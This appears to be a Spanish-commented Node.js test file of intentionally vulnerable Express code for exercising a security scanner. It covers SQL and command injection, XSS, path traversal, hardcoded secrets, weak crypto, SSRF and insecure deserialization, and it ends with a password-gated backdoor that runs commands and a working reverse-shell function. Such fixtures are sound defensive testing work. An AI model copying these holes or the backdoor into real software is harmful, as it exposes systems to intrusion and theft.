/**
 * ⚠️ ARCHIVO DE PRUEBA - CONTIENE CÓDIGO VULNERABLE INTENCIONALMENTE
 * 
 * Este archivo contiene ejemplos de vulnerabilidades comunes para
 * probar el scanner. NO USAR EN PRODUCCIÓN.
 */

const express = require('express');
const mysql = require('mysql');
const { exec } = require('child_process');
const fs = require('fs');
const crypto = require('crypto');

const app = express();

// ========================================
// VULNERABILIDADES DE INYECCIÓN SQL
// ========================================

// ❌ SQL Injection - Concatenación directa
app.get('/users/:id', (req, res) => {
    const userId = req.params.id;
    const query = "SELECT * FROM users WHERE id = " + userId;
    connection.query(query, (err, results) => {
        res.json(results);
    });
});

// ❌ SQL Injection con template strings
app.get('/search', (req, res) => {
    const term = req.query.term;
    const sql = `SELECT * FROM products WHERE name LIKE '%${term}%'`;
    connection.query(sql, (err, results) => {
        res.json(results);
    });
});

// ========================================
// CROSS-SITE SCRIPTING (XSS)
// ========================================

// ❌ XSS - innerHTML con entrada de usuario
app.get('/profile', (req, res) => {
    const name = req.query.name;
    res.send(`
        <html>
            <body>
                <div id="user">${name}</div>
                <script>
                    document.getElementById('user').innerHTML = "${name}";
                </script>
            </body>
        </html>
    `);
});

// ❌ XSS - document.write
function displayMessage(msg) {
    document.write('<p>' + msg + '</p>');
}

// ❌ XSS - eval con entrada de usuario
app.post('/calculate', (req, res) => {
    const expression = req.body.expr;
    const result = eval(expression);  // Extremadamente peligroso
    res.json({ result });
});

// ========================================
// INYECCIÓN DE COMANDOS
// ========================================

// ❌ Command Injection - exec con entrada de usuario
app.get('/ping', (req, res) => {
    const host = req.query.host;
    exec('ping -c 4 ' + host, (error, stdout, stderr) => {
        res.send(stdout);
    });
});

// ❌ Command Injection con template string
app.get('/dns', (req, res) => {
    const domain = req.query.domain;
    exec(`nslookup ${domain}`, (error, stdout, stderr) => {
        res.send(stdout);
    });
});

// ========================================
// CREDENCIALES HARDCODEADAS
// ========================================

// ❌ Contraseña en código
const dbPassword = "SuperSecretPassword123!";
const apiKey = "sk-1234567890abcdef1234567890abcdef";
const awsSecretKey = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY";

const connection = mysql.createConnection({
    host: 'localhost',
    user: 'root',
    password: 'root123',  // ❌ Contraseña hardcodeada
    database: 'app'
});

// ❌ JWT Secret en código
const jwtSecret = "my-super-secret-jwt-key-that-should-not-be-here";

// ========================================
// PATH TRAVERSAL
// ========================================

// ❌ Path Traversal - Lectura de archivo arbitrario
app.get('/files/:filename', (req, res) => {
    const filename = req.params.filename;
    const filepath = './uploads/' + filename;  // Sin sanitización
    fs.readFile(filepath, (err, data) => {
        res.send(data);
    });
});

// ❌ Path Traversal con resolución
app.get('/download', (req, res) => {
    const file = req.query.file;
    const content = fs.readFileSync('/var/data/' + file);
    res.send(content);
});

// ========================================
// CRIPTOGRAFÍA DÉBIL
// ========================================

// ❌ MD5 para hashing de contraseñas
function hashPassword(password) {
    return crypto.createHash('md5').update(password).digest('hex');
}

// ❌ SHA1 (también obsoleto)
function hashData(data) {
    return crypto.createHash('sha1').update(data).digest('hex');
}

// ❌ DES (algoritmo obsoleto)
function encryptData(data, key) {
    const cipher = crypto.createCipher('des', key);
    return cipher.update(data, 'utf8', 'hex') + cipher.final('hex');
}

// ========================================
// DESERIALIZACIÓN INSEGURA
// ========================================

// ❌ node-serialize es vulnerable
const serialize = require('node-serialize');

app.post('/data', (req, res) => {
    const data = req.body.data;
    const obj = serialize.unserialize(data);  // RCE vulnerable
    res.json(obj);
});

// ========================================
// PROTOTYPE POLLUTION
// ========================================

// ❌ Merge sin protección
function merge(target, source) {
    for (let key in source) {
        if (typeof source[key] === 'object') {
            target[key] = merge(target[key] || {}, source[key]);
        } else {
            target[key] = source[key];
        }
    }
    return target;
}

// ❌ Object.assign con entrada de usuario
app.post('/config', (req, res) => {
    const userConfig = req.body.config;
    Object.assign({}, JSON.parse(userConfig));
    res.json({ success: true });
});

// ========================================
// INFORMACIÓN SENSIBLE EXPUESTA
// ========================================

// ❌ Stack trace expuesto
app.use((err, req, res, next) => {
    console.error(err.stack);
    res.status(500).send({
        error: err.message,
        stack: err.stack  // ❌ No exponer en producción
    });
});

// ========================================
// SSRF (Server-Side Request Forgery)
// ========================================

const axios = require('axios');

// ❌ SSRF - URL de usuario sin validar
app.get('/fetch', async (req, res) => {
    const url = req.query.url;
    const response = await axios.get(url);  // Puede acceder a red interna
    res.send(response.data);
});

// ========================================
// OPEN REDIRECT
// ========================================

// ❌ Redirección abierta
app.get('/redirect', (req, res) => {
    const url = req.query.url;
    res.redirect(url);  // Sin validación
});

// ========================================
// INSECURE RANDOM
// ========================================

// ❌ Math.random para tokens de seguridad
function generateToken() {
    return Math.random().toString(36).substring(7);
}

function generateSessionId() {
    return 'session_' + Math.random().toString(16);
}

// ========================================
// TIMING ATTACK
// ========================================

// ❌ Comparación no segura de tokens
function validateApiKey(userKey) {
    const validKey = process.env.API_KEY;
    return userKey === validKey;  // Vulnerable a timing attack
}

// ========================================
// SERVIDOR SIN SEGURIDAD
// ========================================

// ❌ Sin HTTPS, sin rate limiting, sin helmet
app.listen(3000, () => {
    console.log('Server running on http://localhost:3000');
});

// ========================================
// POTENCIAL BACKDOOR / CÓDIGO SOSPECHOSO
// ========================================

// ❌ Ejecución de código remoto
app.get('/admin/exec', (req, res) => {
    if (req.query.auth === 'backdoor123') {
        const cmd = Buffer.from(req.query.c, 'base64').toString();
        exec(cmd, (err, stdout) => res.send(stdout));
    }
});

// ❌ Reverse shell sospechoso
function connectBack(host, port) {
    const net = require('net');
    const { spawn } = require('child_process');
    const client = new net.Socket();
    client.connect(port, host, () => {
        const sh = spawn('/bin/sh', []);
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
}

module.exports = app;
